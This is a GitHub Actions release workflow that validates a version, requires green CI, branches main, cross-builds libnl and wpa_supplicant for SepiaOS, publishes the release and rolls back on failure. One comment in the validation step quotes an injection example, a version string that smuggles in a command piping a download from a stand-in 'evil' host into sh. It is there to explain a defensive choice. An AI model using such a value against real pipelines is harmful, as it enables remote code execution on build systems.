name: Release

# Publishes the wifi userspace package - libnl and wpa_supplicant. Manual on purpose: the version is
# a human decision, so the person cutting the release types it in.
#
# main is branched into rel-<version> and both the build and the release run on
# that branch, so the released commit is a thing that still exists afterwards
# and main can move on underneath it. The ref this workflow is dispatched on is
# therefore ignored: the release always comes from main's head at the moment the
# gate runs.
#
# The gate that a `workflow_run` trigger would have given for free is enforced
# explicitly instead: the `gate` job refuses to release a commit that CI has not
# passed on.
#
# Every release is kept - the asset is ~348 KB, so there is nothing to reclaim
# by deleting old ones, and an old tag staying put is worth more than the space.
# ../llvm keeps only the newest because its asset is ~60 MiB; that is a
# consequence of size, not a house rule.
#
# Creating the branch is a push, so ci.yml runs on it as well. That duplicate
# build costs a runner and delays nothing, and "every branch is built" is the
# rule this project works to.
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to release, e.g. 2026.09.04 or 1.0.0-rc1 (a leading "v" is added if missing)'
        required: true
        type: string
      musl_tag:
        description: 'Pin a specific Sepia-OS/musl release to build against instead of the newest one (optional).'
        required: false
        default: ''
        type: string
      prerelease:
        description: 'Mark as a pre-release, so it is not shown as Latest'
        required: false
        default: false
        type: boolean

# One release at a time. Not cancel-in-progress: a half-finished publish would
# leave a tag or a release behind with no assets on it.
concurrency:
  group: release
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  # -------------------------------------------------------------------------
  # Everything that can say "no" happens here, before the build: the version is
  # validated, the commit is checked against CI, and the tag is checked for
  # collisions. Cheap, and it fails in seconds.
  # -------------------------------------------------------------------------
  gate:
    name: check the version, then branch main
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    outputs:
      tag: ${{ steps.version.outputs.tag }}
      branch: ${{ steps.version.outputs.branch }}
      sha: ${{ steps.main.outputs.sha }}
      created: ${{ steps.branch.outputs.created }}
    steps:
      # `inputs.version` is attacker-controlled text. It is passed through the
      # environment rather than interpolated into the script, because `${{ }}`
      # is substituted before bash ever sees the line — a version of
      # `x"; curl evil | sh; #` would otherwise run.
      - name: Validate the version
        id: version
        env:
          VERSION: ${{ inputs.version }}
        run: |
          # Trim the ends only. Deleting all whitespace would quietly turn a
          # fat-fingered "1.0 0" into "1.00" and release the wrong version;
          # internal whitespace has to reach the pattern below and be rejected.
          version="$VERSION"
          version="${version#"${version%%[![:space:]]*}"}"
          version="${version%"${version##*[![:space:]]}"}"
          version="${version#v}"
          # Must start with a digit and stay inside what git accepts as a tag
          # and what a filename can carry: no slashes, no shell metacharacters.
          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
            echo "::error title=Bad version::'${VERSION}' is not a version." \
                 "Expected something like 2026.09.04, 1.0.0 or 1.0.0-rc1," \
                 "optionally with a leading v."
            exit 1
          fi
          {
            echo "tag=v${version}"
            echo "branch=rel-${version}"
          } >> "$GITHUB_OUTPUT"
          echo "Releasing v${version} from rel-${version}"

      # Resolved once, here, and then used for everything downstream: the CI
      # check, the branch, the release target and the commit named in the
      # notes. Reading main's head again later would open a window where CI was
      # checked on one commit and another was released.
      - name: Resolve the head of main
        id: main
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          sha="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/main" --jq '.object.sha')"
          [ -n "$sha" ] || { echo "::error::could not read the head of main"; exit 1; }
          echo "sha=${sha}" >> "$GITHUB_OUTPUT"
          echo "main is at ${sha}"

      # A manual trigger cannot inherit "CI passed on this commit" the way an
      # automatic one would, so it is asked for outright - and asked about the
      # commit being released, which is main's head rather than whatever ref
      # this workflow happened to be dispatched on.
      - name: Require a green CI run for that commit
        env:
          GH_TOKEN: ${{ github.token }}
          SHA: ${{ steps.main.outputs.sha }}
        run: |
          runs="$(gh api \
            "repos/${GITHUB_REPOSITORY}/actions/workflows/ci.yml/runs?head_sha=${SHA}&status=success" \
            --jq '.total_count' 2>/dev/null || echo 0)"
          if [ "${runs:-0}" -eq 0 ]; then
            echo "::error title=No green CI run::main (${SHA}) has no successful" \
                 "CI run. Push it, wait for CI, then release — or re-run CI on it."
            exit 1
          fi
          echo "CI passed on ${SHA} (${runs} successful run(s))"

      # The tag and the release are refused if they exist; the *branch*
      # deliberately is not. A release branch left behind by a failed earlier
      # attempt at this same version is the normal case for a retry, and
      # demanding it be deleted by hand first would make every retry a chore.
      # Nothing is ever committed to a release branch, so reusing one loses
      # nothing.
      - name: Refuse to overwrite an existing release or tag
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ steps.version.outputs.tag }}
        run: |
          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "::error title=${TAG} already released::Pick a different version," \
                 "or delete the old release first:" \
                 "gh release delete ${TAG} --cleanup-tag"
            exit 1
          fi
          # Asked over the API, not with git ls-remote: this job has no checkout,
          # so there is no repository for git to read an `origin` from.
          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
            echo "::error title=${TAG} already tagged::The tag exists without a" \
                 "release. Delete it (git push --delete origin ${TAG}) or pick" \
                 "a different version."
            exit 1
          fi

      # Created before the build rather than after it, because the build has to
      # run *on* the release branch - that is what makes the released commit
      # something that still exists whatever main does next.
      #
      # If the branch is already there it is reused rather than recreated: it is
      # moved to the commit being released, because main has usually advanced
      # past whatever made the earlier attempt fail. `created` records which of
      # the two happened, so the rollback below only ever deletes a branch this
      # run made - deleting one that was already there would be destroying
      # something this run did not create.
      - name: Branch main into the release branch
        id: branch
        env:
          GH_TOKEN: ${{ github.token }}
          BRANCH: ${{ steps.version.outputs.branch }}
          SHA: ${{ steps.main.outputs.sha }}
        run: |
          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BRANCH}" >/dev/null 2>&1; then
            gh api --method PATCH "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}" \
              -F force=true -f "sha=${SHA}" >/dev/null
            echo "created=false" >> "$GITHUB_OUTPUT"
            echo "::notice title=Reused ${BRANCH}::The branch already existed and was" \
                 "moved to main's head (${SHA}). It will be left in place whatever" \
                 "happens next."
          else
            gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" \
              -f "ref=refs/heads/${BRANCH}" -f "sha=${SHA}" >/dev/null
            echo "created=true" >> "$GITHUB_OUTPUT"
            echo "Branched main (${SHA}) into ${BRANCH}"
          fi

  # -------------------------------------------------------------------------
  # The cross-build, in the same container CI verified in - and on Linux
  # because the toolchain vendor, and therefore the binaries, differ by build
  # host.
  # -------------------------------------------------------------------------
  build:
    name: cross-build and pack
    needs: gate
    runs-on: ubuntu-latest
    timeout-minutes: 30
    container: debian:trixie-slim
    env:
      # api.github.com is asked which musl release to build against; see ci.yml.
      GITHUB_TOKEN: ${{ github.token }}
      MUSL_TAG: ${{ inputs.musl_tag }}
    outputs:
      asset: ${{ steps.identity.outputs.asset }}
      libnl: ${{ steps.identity.outputs.libnl }}
      wpa: ${{ steps.identity.outputs.wpa }}
      musl: ${{ steps.identity.outputs.musl }}
      musl_release: ${{ steps.identity.outputs.musl_release }}
      triple: ${{ steps.identity.outputs.triple }}
      toolchain: ${{ steps.identity.outputs.toolchain }}
    steps:
      # Before checkout on purpose: without git in the container,
      # actions/checkout silently falls back to downloading a tarball.
      #
      # Keep this list identical to ci.yml's, or a release builds in a container
      # CI never tested. jq reads the musl release metadata; there is
      # deliberately no compiler, because everything is built by the downloaded
      # cross-toolchain.
      - name: Install build tools
        run: |
          apt-get update -qq
          apt-get install -y -qq --no-install-recommends \
            make git curl ca-certificates jq xz-utils

      # The release branch, not the dispatched ref: this is the whole point of
      # having branched.
      - uses: actions/checkout@v5
        with:
          ref: ${{ needs.gate.outputs.branch }}

      # One goal: stage pulls the toolchain, the musl sysroot, both source
      # downloads and the two cross-builds in behind it.
      - name: Build and stage
        run: make stage

      # Nothing ships until all five staged files have been read back.
      - name: Verify the staged tree
        run: make stage-check

      # After the build, not before: the musl release this was linked against
      # is only known once it has been resolved, and it is the fact worth
      # publishing most. Everything else is read out of the Makefile rather
      # than written twice - print-% and these variable names are a CI
      # contract.
      - name: Read what is being released
        id: identity
        env:
          TAG: ${{ needs.gate.outputs.tag }}
        run: |
          . build/musl/release.env
          {
            echo "asset=$(make -s DIST_TAG="$TAG" print-DIST_ASSET)"
            echo "libnl=$(make -s print-LIBNL_VERSION)"
            echo "wpa=$(make -s print-WPA_VERSION)"
            echo "musl=${MUSL_VER}"
            echo "musl_release=${MUSL_TAG}"
            echo "triple=$(make -s print-TARGET_TRIPLE)"
            echo "toolchain=$(make -s print-TC_VENDOR) $(make -s print-TC_VERSION)"
          } >> "$GITHUB_OUTPUT"

      - name: Pack the release asset
        env:
          TAG: ${{ needs.gate.outputs.tag }}
        run: |
          make DIST_TAG="$TAG" dist
          make DIST_TAG="$TAG" dist-info

      # compression-level 0: the payload is already xz -9, so zipping it again
      # only burns CPU.
      - uses: actions/upload-artifact@v5
        with:
          name: release-assets
          path: dist/
          compression-level: 0
          if-no-files-found: error

      - name: Upload the build logs
        if: failure()
        uses: actions/upload-artifact@v5
        with:
          name: build-logs
          path: |
            build/src/*/configure.log
            build/src/*/build.log
          if-no-files-found: ignore

  # -------------------------------------------------------------------------
  # Publishing is a separate job purely so it can run on the bare runner, where
  # `gh` is preinstalled. Debian does not package the GitHub CLI, so doing this
  # in the build container would mean either a third-party action or hand-rolled
  # REST calls.
  #
  # `gh release create --target` creates the tag as part of the release, so the
  # "tag exists but the release does not" half-state cannot happen.
  # -------------------------------------------------------------------------
  publish:
    name: publish the release
    needs: [gate, build]
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: write
    steps:
      - uses: actions/download-artifact@v5
        with:
          name: release-assets
          path: dist

      - name: Create the release
        env:
          GH_TOKEN: ${{ github.token }}
          TAG: ${{ needs.gate.outputs.tag }}
          BRANCH: ${{ needs.gate.outputs.branch }}
          SHA: ${{ needs.gate.outputs.sha }}
          ASSET: ${{ needs.build.outputs.asset }}
          LIBNL: ${{ needs.build.outputs.libnl }}
          WPA: ${{ needs.build.outputs.wpa }}
          MUSL: ${{ needs.build.outputs.musl }}
          MUSL_RELEASE: ${{ needs.build.outputs.musl_release }}
          TRIPLE: ${{ needs.build.outputs.triple }}
          TOOLCHAIN: ${{ needs.build.outputs.toolchain }}
          PRERELEASE: ${{ inputs.prerelease }}
        run: |
          cat > notes.md <<EOF
          The wifi userspace for SepiaOS: libnl and wpa_supplicant, cross-built
          for aarch64 and linked dynamically against musl, to run **on** the
          Raspberry Pi. Together they are what turns a Broadcom radio and an
          nl80211 driver into a device that can join a network.

          | | |
          |---|---|
          | wpa_supplicant | \`${WPA}\` |
          | libnl | \`${LIBNL}\` |
          | Target triple | \`${TRIPLE}\` |
          | Built against musl | \`${MUSL}\` (\`${MUSL_RELEASE}\` from \`Sepia-OS/musl\`) |
          | Cross-toolchain | \`${TOOLCHAIN}\` |
          | Commit | \`${SHA}\` |
          | Branch | \`${BRANCH}\` |

          The asset is a \`usr/\` tree: \`wpa_supplicant\`, \`wpa_cli\` and
          \`wpa_passphrase\` in \`usr/sbin\`, \`libnl-3\` and
          \`libnl-genl-3\` with their SONAME links in \`usr/lib\`, and both
          licences under \`usr/share/licenses/wifi/\`. \`Sepia-OS/rootfs\`
          unpacks it into the root filesystem.

          \`\`\`sh
          sha256sum -c SHA256SUMS
          tar -C / -xf ${ASSET}
          \`\`\`

          **No OpenSSL.** wpa_supplicant is built with \`CONFIG_TLS=internal\`
          and \`CONFIG_INTERNAL_LIBTOMMATH\`, which covers WPA and WPA2 with a
          passphrase - what a Pi on a home or office network needs. WPA3/SAE and
          EAP-TLS would need a real crypto library and are not built.

          **No firmware, and no libc.** The Broadcom blobs come from
          \`Sepia-OS/rootfs\`, which unpacks them from a Debian package; the
          libc comes from \`Sepia-OS/musl\`. Before publishing, every file here
          was read back: aarch64, on the musl loader, and with every library it
          names either the card's libc or a file in this asset.
          EOF

          if [ "$PRERELEASE" = "true" ]; then
            flag=(--prerelease)
          else
            flag=(--latest)
          fi

          gh release create "$TAG" \
            --repo "$GITHUB_REPOSITORY" \
            --target "$BRANCH" \
            --title "SepiaOS wifi $TAG (wpa_supplicant $WPA, libnl $LIBNL)" \
            --notes-file notes.md \
            "${flag[@]}" \
            "dist/$ASSET" \
            dist/SHA256SUMS

  # -------------------------------------------------------------------------
  # A branch this run created is removed again if the build or the publish
  # fails: it holds nothing main does not - it was created seconds earlier as a
  # pointer to main's head, and nothing ever commits to it - so the same version
  # can be released once whatever failed is fixed.
  #
  # A branch that was already there is left alone. It belongs to an earlier
  # attempt, this run only moved it, and deleting it would be destroying
  # something this run did not create.
  # -------------------------------------------------------------------------
  rollback:
    name: remove the release branch again
    needs: [gate, build, publish]
    if: |
      failure()
      && needs.gate.result == 'success'
      && needs.gate.outputs.created == 'true'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Delete the release branch
        env:
          GH_TOKEN: ${{ github.token }}
          BRANCH: ${{ needs.gate.outputs.branch }}
        run: |
          if gh api --method DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}"; then
            echo "::notice title=Rolled back::${BRANCH} was deleted; the release can be retried."
          else
            echo "::warning title=Branch left behind::${BRANCH} could not be deleted." \
                 "Delete it by hand before retrying this version."
          fi
